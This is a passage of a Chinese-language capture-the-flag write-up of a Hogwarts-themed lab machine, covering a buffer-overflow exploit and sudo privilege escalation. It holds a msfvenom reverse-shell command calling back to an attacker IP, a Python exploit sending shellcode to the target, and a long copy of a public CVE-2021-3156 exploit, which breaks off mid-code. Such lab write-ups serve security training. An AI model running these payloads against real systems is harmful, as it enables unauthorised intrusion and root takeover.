+<p>在程序执行完成（F8）后可以看到EIP寄存器内存放了0x42424242（即BBBB）也就验证了B的位置可以写入目标程序EIP寄存器内，ESP寄存器内都是C</p>
+<p>寻找从ESP指向EIP的指令</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100827186.png" alt="image-20220708100827186"></p>
+<p>寻找具有可执行权限的</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100952711.png" alt="image-20220708100952711"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708101042151.png" alt="image-20220708101042151"></p>
+<p>记录地址0x08049d55（从低位往高位写转为16进制:\x55\x9d\x04\x08） 将其写入‘BBBB’的位置</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708102335787.png" alt="image-20220708102335787"></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>再使用msfvenom生成后门 放入exp中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.110 LPORT=4444 -b &quot;\x00&quot; -f py</span><br><span class="line">#-b参数过滤坏字符</span><br></pre></td></tr></table></figure>
+
+<p>为确保程序运行的稳定性在两部分中间插入NOP空指令</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708134444432.png" alt="image-20220708134444432"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys,socket</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbe\xd0\x48\x83\x8a\xdd\xc0\xd9\x74\x24\xf4\x5b\x29&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x83\xc3\x04\x31\x73\x0e\x03\xa3\x46\x61&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7f\x72\x8c\x92\x63\x27\x71\x0e\x0e\xc5\xfc\x51\x7e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xaf\x33\x11\xec\x76\x7c\x2d\xde\x08\x35\x2b\x19\x60&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x06\x63\xd8\x1e\xee\x76\xdb\xcf\xb2\xff\x3a\x5f\x2c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x50\xec\xcc\x02\x53\x87\x13\xa9\xd4\xc5\xbb\x5c\xfa&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x9a\x53\xc9\x2b\x72\xc1\x60\xbd\x6f\x57\x20\x34\x8e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe7\xcd\x8b\xd1&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span> + <span class="string">&#x27;\x55\x9d\x04\x08&#x27;</span> + <span class="string">&#x27;\x90&#x27;</span>*<span class="number">32</span> + buf</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">    s.send((payload))</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>关闭server_hogwarts 确保进程不存在后重新启动</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708103645058.png" alt="image-20220708103645058"></p>
+<p>侦听本地4444端口后执行exp 成功反弹本机shell</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708134340029.png" alt="image-20220708134340029"></p>
+<p>再将exp替换为目标IP 重新监听本地4444端口后 重新执行</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708135140397.png" alt="image-20220708135140397"></p>
+<p>成功反弹shell</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140004644.png" alt="image-20220708140004644"></p>
+<p>发现在当前目录下存在名为mycreds.txt的文件 查看后像是用户名密码</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708135930211.png" alt="image-20220708135930211"></p>
+<p>尝试使用ssh登陆22端口 提示密码错误</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140701588.png" alt="image-20220708140701588"></p>
+<p>再尝试使用ssh登陆2222端口  登录成功</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140736841.png" alt="image-20220708140736841"></p>
+<p>发现还有其他网卡</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140828290.png" alt="image-20220708140828290"></p>
+<p>通过查看根目录下的文件 推断当前可能是在docker容器内的</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140941575.png" alt="image-20220708140941575"></p>
+<p>再查看当前用户的sudo权限 发现可以直接获取root权限</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708141143890.png" alt="image-20220708141143890"></p>
+<p>在root目录下发现两个文件 horcrux1.txt为第一个flag  note.txt文件内的信息似乎有所指示</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708141641296.png" alt="image-20220708141641296"></p>
+<h3 id="ftp明文流量分析"><a href="#ftp明文流量分析" class="headerlink" title="ftp明文流量分析"></a>ftp明文流量分析</h3><p>鉴于ftp明文传输的特性 进行流量分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 21</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142113110.png" alt="image-20220708142113110"></p>
+<p>获取到了一组用户名和密码 不太确定使用在何处 继续尝试ssh登陆 </p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142325997.png" alt="image-20220708142325997"></p>
+<p>登录成功后查看网卡信息 发现是目标ip192.168.1.101 以及发现与刚才容器内IP地址相同的docker0网卡 也说明了刚才确实是在docker容器内<img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142720991.png" alt="image-20220708142720991"></p>
+<p>尝试查看内核和sudo权限配置 看是否有机会能直接提权 结果并不如意</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142645756.png" alt="image-20220708142645756"></p>
+<p>通过大量的查找搜索 发现CVE-2021-3156</p>
+<p>查看目标机器的系统和sudo版本也符合</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708143146037.png" alt="image-20220708143146037"></p>
+<p>验证</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>在msf内搜索CVE-2021-3156 发现确实存在该漏洞利用模块 但是需要获取和目标的session</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708144317862.png" alt="image-20220708144317862"></p>
+<p>使用ssh模块登陆获取session</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708144652783.png" alt="image-20220708144652783"></p>
+<p>在攻击模块内配置session后仍然无法成功利用</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708145500413.png" alt="image-20220708145500413"></p>
+<p>在尝试修改WritableDir目录（&#x2F;home&#x2F;harry）后 仍然不能成功利用</p>
+<p>放弃使用msf 继续查找</p>
+<h4 id="修改exp"><a href="#修改exp" class="headerlink" title="修改exp"></a>修改exp</h4><p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py">https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py</a></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220714144431446.png" alt="image-20220714144431446"></p>
+<p>对其代码内的SUDO_PATH进行修改:</p>
+<p>Linux下的sudo一般存放在&#x2F;usr&#x2F;bin&#x2F;sudo 但是目标靶机的sudo存放在&#x2F;usr&#x2F;local&#x2F;bin&#x2F;sudo 更改其地址为&#x2F;usr&#x2F;local&#x2F;bin&#x2F;sudo</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176484-dfa334ed-fe19-4f3a-be79-cf78c16bffd4.png" alt="Snipaste_2022-07-14_14-18-59.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Exploit for CVE-2021-3156 with overwrite struct service_user by sleepya</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This exploit requires:</span></span><br><span class="line"><span class="string">- glibc with tcache</span></span><br><span class="line"><span class="string">- nscd service is not running</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Tested on:</span></span><br><span class="line"><span class="string">- Ubuntu 18.04</span></span><br><span class="line"><span class="string">- Ubuntu 20.04</span></span><br><span class="line"><span class="string">- Debian 10</span></span><br><span class="line"><span class="string">- CentOS 8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll, c_char_p, POINTER, c_int, c_void_p</span><br><span class="line"></span><br><span class="line">SUDO_PATH = <span class="string">b&quot;/usr/local/bin/sudo&quot;</span></span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># don&#x27;t use LC_ALL (6). it override other LC_</span></span><br><span class="line">LC_CATS = [</span><br><span class="line">	<span class="string">b&quot;LC_CTYPE&quot;</span>, <span class="string">b&quot;LC_NUMERIC&quot;</span>, <span class="string">b&quot;LC_TIME&quot;</span>, <span class="string">b&quot;LC_COLLATE&quot;</span>, <span class="string">b&quot;LC_MONETARY&quot;</span>,</span><br><span class="line">	<span class="string">b&quot;LC_MESSAGES&quot;</span>, <span class="string">b&quot;LC_ALL&quot;</span>, <span class="string">b&quot;LC_PAPER&quot;</span>, <span class="string">b&quot;LC_NAME&quot;</span>, <span class="string">b&quot;LC_ADDRESS&quot;</span>,</span><br><span class="line">	<span class="string">b&quot;LC_TELEPHONE&quot;</span>, <span class="string">b&quot;LC_MEASUREMENT&quot;</span>, <span class="string">b&quot;LC_IDENTIFICATION&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_is_vuln</span>():</span><br><span class="line">	<span class="comment"># below commands has no log because it is invalid argument for both patched and unpatched version</span></span><br><span class="line">	<span class="comment"># patched version, error because of &#x27;-s&#x27; argument</span></span><br><span class="line">	<span class="comment"># unpatched version, error because of &#x27;-A&#x27; argument but no SUDO_ASKPASS environment</span></span><br><span class="line">	r, w = os.pipe()</span><br><span class="line">	pid = os.fork()</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> pid:</span><br><span class="line">		<span class="comment"># child</span></span><br><span class="line">		os.dup2(w, <span class="number">2</span>)</span><br><span class="line">		execve(SUDO_PATH, [ <span class="string">b&quot;sudoedit&quot;</span>, <span class="string">b&quot;-s&quot;</span>, <span class="string">b&quot;-A&quot;</span>, <span class="string">b&quot;/aa&quot;</span>, <span class="literal">None</span> ], [ <span class="literal">None</span> ])</span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line">	<span class="comment"># parent</span></span><br><span class="line">	os.close(w)</span><br><span class="line">	os.waitpid(pid, <span class="number">0</span>)</span><br><span class="line">	r = os.fdopen(r, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">	err = r.read()</span><br><span class="line">	r.close()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;sudoedit: no askpass program specified, try setting SUDO_ASKPASS&quot;</span> <span class="keyword">in</span> err:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">assert</span> err.startswith(<span class="string">&#x27;usage: &#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;invalid mode flags &quot;</span> <span class="keyword">in</span> err, err</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_libx</span>(<span class="params">name</span>):</span><br><span class="line">	so_path = <span class="string">&#x27;libnss_&#x27;</span>+name+<span class="string">&#x27;.so.2&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> os.path.isfile(so_path):</span><br><span class="line">		<span class="keyword">return</span>  <span class="comment"># existed</span></span><br><span class="line">	</span><br><span class="line">	so_dir = <span class="string">&#x27;libnss_&#x27;</span> + name.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(so_dir):</span><br><span class="line">		os.makedirs(so_dir)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">import</span> zlib</span><br><span class="line">	<span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">	libx_b64 = <span class="string">&#x27;eNqrd/VxY2JkZIABZgY7BhBPACrkwIAJHBgsGJigbJAydgbcwJARlWYQgFBMUH0boMLodAIazQGl\neWDGQM1jRbOPDY3PhcbnZsAPsjIjDP/zs2ZlRfCzGn7z2KGflJmnX5zBEBASn2UdMZOfFQDLghD3&#x27;</span></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(so_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(zlib.decompress(base64.b64decode(libx_b64)))</span><br><span class="line">	<span class="comment">#os.chmod(so_path, 0o755)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_nscd_condition</span>():</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;/var/run/nscd/socket&#x27;</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span> <span class="comment"># no socket. no service</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># try connect</span></span><br><span class="line">	<span class="keyword">import</span> socket</span><br><span class="line">	sk = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		sk.connect(<span class="string">&#x27;/var/run/nscd/socket&#x27;</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sk.close()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/etc/nscd.conf&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		<span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">			line = line.strip()</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> line.startswith(<span class="string">&#x27;enable-cache&#x27;</span>):</span><br><span class="line">				<span class="keyword">continue</span> <span class="comment"># comment</span></span><br><span class="line">			service, enable = line.split()[<span class="number">1</span>:]</span><br><span class="line">			<span class="comment"># in fact, if only passwd is enabled, exploit with this method is still possible (need test)</span></span><br><span class="line">			<span class="comment"># I think no one enable passwd but disable group</span></span><br><span class="line">			<span class="keyword">if</span> service == <span class="string">&#x27;passwd&#x27;</span> <span class="keyword">and</span> enable == <span class="string">&#x27;yes&#x27;</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">			<span class="comment"># group MUST be disabled to exploit sudo with nss_load_library() trick</span></span><br><span class="line">			<span class="keyword">if</span> service == <span class="string">&#x27;group&#x27;</span> <span class="keyword">and</span> enable == <span class="string">&#x27;yes&#x27;</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">			</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc_version</span>():</span><br><span class="line">	output = subprocess.check_output([<span class="string">&#x27;ldd&#x27;</span>, <span class="string">&#x27;--version&#x27;</span>], universal_newlines=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> output.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">		<span class="keyword">if</span> line.startswith(<span class="string">&#x27;ldd &#x27;</span>):</span><br><span class="line">			ver_txt = line.rsplit(<span class="string">&#x27; &#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, ver_txt.split(<span class="string">&#x27;.&#x27;</span>)))</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_libc_version</span>():</span><br><span class="line">	version = get_libc_version()</span><br><span class="line">	<span class="keyword">assert</span> version, <span class="string">&quot;Cannot detect libc version&quot;</span></span><br><span class="line">	<span class="comment"># this exploit only works which glibc tcache (added in 2.26)</span></span><br><span class="line">	<span class="keyword">return</span> version[<span class="number">0</span>] &gt;= <span class="number">2</span> <span class="keyword">and</span> version[<span class="number">1</span>] &gt;= <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_libc_tcache</span>():</span><br><span class="line">	libc.malloc.argtypes = (c_int,)</span><br><span class="line">	libc.malloc.restype = c_void_p</span><br><span class="line">	libc.free.argtypes = (c_void_p,)</span><br><span class="line">	<span class="comment"># small bin or tcache</span></span><br><span class="line">	size1, size2 = <span class="number">0xd0</span>, <span class="number">0xc0</span></span><br><span class="line">	mems = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">	<span class="comment"># consume all size2 chunks</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mems)):</span><br><span class="line">		mems[i] = libc.malloc(size2)</span><br><span class="line">		</span><br><span class="line">	mem1 = libc.malloc(size1)</span><br><span class="line">	libc.free(mem1)</span><br><span class="line">	mem2 = libc.malloc(size2)</span><br><span class="line">	libc.free(mem2)</span><br><span class="line">	<span class="keyword">for</span> addr <span class="keyword">in</span> mems:</span><br><span class="line">		libc.free(addr)</span><br><span class="line">	<span class="keyword">return</span> mem1 != mem2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_service_user_idx</span>():</span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;Parse /etc/nsswitch.conf to find a group entry index</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	idx = <span class="number">0</span></span><br><span class="line">	found = <span class="literal">False</span></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/etc/nsswitch.conf&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		<span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">			<span class="keyword">if</span> line.startswith(<span class="string">&#x27;#&#x27;</span>):</span><br><span class="line">				<span class="keyword">continue</span> <span class="comment"># comment</span></span><br><span class="line">			line = line.strip()</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">				<span class="keyword">continue</span> <span class="comment"># empty line</span></span><br><span class="line">			words = line.split()</span><br><span class="line">			<span class="keyword">if</span> words[<span class="number">0</span>] == <span class="string">&#x27;group:&#x27;</span>:</span><br><span class="line">				found = <span class="literal">True</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">for</span> word <span class="keyword">in</span> words[<span class="number">1</span>:]:</span><br><span class="line">				<span class="keyword">if</span> word[<span class="number">0</span>] != <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">					idx += <span class="number">1</span></span><br><span class="line">			</span><br><span class="line">	<span class="keyword">assert</span> found, <span class="string">&#x27;&quot;group&quot; database is not found. might be exploitable but no test&#x27;</span></span><br><span class="line">	<span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_extra_chunk_count</span>(<span class="params">target_chunk_size</span>):</span><br><span class="line">	<span class="comment"># service_user are allocated by calling getpwuid()</span></span><br><span class="line">	<span class="comment"># so we don&#x27;t care allocation of chunk size 0x40 after getpwuid()</span></span><br><span class="line">	<span class="comment"># there are many string that size can be varied</span></span><br><span class="line">	<span class="comment"># here is the most common</span></span><br><span class="line">	chunk_cnt = <span class="number">0</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># get_user_info() -&gt; get_user_groups() -&gt;</span></span><br><span class="line">	gids = os.getgroups()</span><br><span class="line">	malloc_size = <span class="built_in">len</span>(<span class="string">&quot;groups=&quot;</span>) + <span class="built_in">len</span>(gids) * <span class="number">11</span></span><br><span class="line">	chunk_size = (malloc_size + <span class="number">8</span> + <span class="number">15</span>) &amp; <span class="number">0xfffffff0</span>  <span class="comment"># minimum size is 0x20. don&#x27;t care here</span></span><br><span class="line">	<span class="keyword">if</span> chunk_size == target_chunk_size: chunk_cnt += <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># host=&lt;hostname&gt;  (unlikely)</span></span><br><span class="line">	<span class="comment"># get_user_info() -&gt; sudo_gethostname()</span></span><br><span class="line">	<span class="keyword">import</span> socket</span><br><span class="line">	malloc_size = <span class="built_in">len</span>(<span class="string">&quot;host=&quot;</span>) + <span class="built_in">len</span>(socket.gethostname()) + <span class="number">1</span></span><br><span class="line">	chunk_size = (malloc_size + <span class="number">8</span> + <span class="number">15</span>) &amp; <span class="number">0xfffffff0</span></span><br><span class="line">	<span class="keyword">if</span> chunk_size == target_chunk_size: chunk_cnt += <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># simply parse &quot;networks=&quot; from &quot;ip addr&quot; command output</span></span><br><span class="line">	<span class="comment"># another workaround is bruteforcing with number of 0x70</span></span><br><span class="line">	<span class="comment"># policy_open() -&gt; format_plugin_settings() -&gt;</span></span><br><span class="line">	<span class="comment"># a value is created from 